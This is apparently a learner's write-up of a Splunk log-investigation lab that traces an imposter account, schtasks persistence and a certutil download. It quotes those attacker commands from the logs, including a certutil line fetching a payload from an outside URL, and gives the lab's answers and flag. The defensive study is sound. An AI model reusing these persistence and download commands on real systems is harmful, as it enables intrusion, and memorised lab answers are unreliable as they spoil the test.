## SCENARIO: Potential Persistence

One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. 
Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation.

### About the Network Information

The network is divided into three logical segments. It will help in the investigation.

**IT Department**

    James
    Moin
    Katrina

**HR department**

    Haroon
    Chris
    Diana

**Marketing department**

    Bell
    Amelia
    Deepak

Answer the questions below

---

### How many logs are ingested from the month of March, 2022?

Adjusted the date range on splunk to cover only March of 2022. Answer = `13959`

<img width="743" height="397" alt="image" src="https://github.com/user-attachments/assets/327cba39-65cf-424d-912e-d770d7d47af0" />

---

### Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?
Firstly, looking at the fields panel I noticed `UserName` amount is 11. With only 9 users in the network, I wondered who the other 2 were. So i created a simple search query to show me the `UserName` and their corresponding `HostName`
`index=win_eventlogs 
| stats values(UserName) as User values(HostName) as HostName`

<img width="1392" height="669" alt="image" src="https://github.com/user-attachments/assets/f92a5393-72ff-41bd-b5c5-3ec6d442d28d" />

I noticed 2 Amelia's - but hang on, looking closer, one of them has the number `1` in place of the letter `i`

<img width="81" height="57" alt="image" src="https://github.com/user-attachments/assets/8cf5b444-9349-4330-ba95-376fa98f7875" />

I think I found the imposter. **Amel1a**

---

### Which user from the HR department was observed to be running scheduled tasks?

To determine which user from HR was observe running scheduled tasks I tailored my search to correlate HostNane, UserName, and ProcessName and displayed it in a table. The result showed multiple HR users against scheduled tasks. So i added CommandLine to the table to see what was happening with each schtask event.

<img width="1910" height="902" alt="image" src="https://github.com/user-attachments/assets/8afd0cdb-cc42-4adf-bc81-87cb90cd92b7" />

This helped narrow things down as it appears that the user Chris.fort on HR_02 had run `/create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart`
Breaking the command down, the user has created a task named OfficUpdater - note the mispelled word Office, and the task is executing a file named `update.exe` from the directory `\AppData\Local\Temp` and it's scheduled to trigger on the host machine startup.

This is a big red flag for establishing persistence on a host machine.

---

### Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host. Hint - Explore lolbas-project.github.io/ to find binaries used to download payloads

After looking at the lolbas project on github. I started searching for binaries that I am familiar with when it comes to downloading payloads. I started with a common one I have seen called `certutil` and lucky me I had 1 event come up showing the user `haroon` had run the command `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe`

<img width="850" height="561" alt="image" src="https://github.com/user-attachments/assets/b6bf542c-8999-46d5-a704-881b08c48a1d" />

Breaking down the command, the user haroon has used the windows binary `certutil.exe` to force retrieve content from the url `https://controlc.com/e4d11035` and save it as a file named `benign.exe`

---

### To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

The user haroon used `certutil.exe` to bypass security controls, as certutil is a legitimate Windows binary.

---

### What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

2022-03-04

---

### Which third-party site was accessed to download the malicious payload?

https://controlc.com/

---

### What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

benign.exe

---

### The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

Running the source URL in VirusTotal I was able to determine the pattern in the HTML section as `THM{KJ&*H^B0}`

<img width="867" height="355" alt="image" src="https://github.com/user-attachments/assets/7b594acd-76bc-46c7-b525-c1fcbdc0f4d8" />

Alternatively, we can run the URL in a controlled sandbox environment to get the same result.

<img width="460" height="415" alt="image" src="https://github.com/user-attachments/assets/0e8022d4-dfe7-484c-82ee-43a209d8838a" />


---

### What is the URL that the infected host connected to?

https://controlc.com/e4d11035

---

## END OF INVESTIGATION

